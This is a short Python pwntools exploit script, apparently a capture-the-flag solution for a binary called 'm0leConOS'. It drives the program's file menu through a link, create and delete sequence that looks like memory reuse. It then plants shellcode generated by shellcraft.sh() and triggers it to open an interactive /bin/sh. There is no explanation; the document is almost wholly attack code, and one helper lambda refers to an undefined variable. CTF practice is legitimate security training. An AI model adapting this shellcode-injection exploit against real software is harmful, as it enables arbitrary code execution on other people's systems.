from pwn import *
context(os='linux', arch='amd64', log_level='debug')

procname = './m0leConOS'
# libcname = './libc.so.6'

io = process(procname, stdin=PTY)
#io = remote('0', 1337)
elf = ELF(procname)
#libc = ELF(libcname)

n2b = lambda x    : str(x).encode()
rv  = lambda x    : io.recv(x)
ru  = lambda s    : io.recvuntil(s, drop=True)
sd  = lambda s    : io.send(s)
sl  = lambda s    : io.sendline(s)
sn  = lambda s    : sl(n2b(n))
sa  = lambda p, s : io.sendafter(p, s)
sla = lambda p, s : io.sendlineafter(p, s)
sna = lambda p, n : sla(p, n2b(n))
ia  = lambda      : io.interactive()
rop = lambda r    : flat([p64(x) for x in r])

prompt      = b':'
prompt_menu = prompt
prompt_idx  = prompt

op   = lambda x : sla(prompt_menu, n2b(x))
snap = lambda n : sna(prompt, n)
sidx = lambda x : sla(prompt_idx, n2b(x))
sap  = lambda s : sa(prompt, s)
slap = lambda s : sla(prompt, s)

slap(b'ln')
slap(b'm0lecat')
slap(b'1')

slap(b'touch')
slap(b'2')
slap(b'Wings')

slap(b'rm')
slap(b'1')
slap(b'rm')
slap(b'2')

slap(b'touch')
slap(b'3')
slap(asm(shellcraft.sh()))

slap(b'm0lecat')
sla(b'> ', b'/bin/sh')

ia()
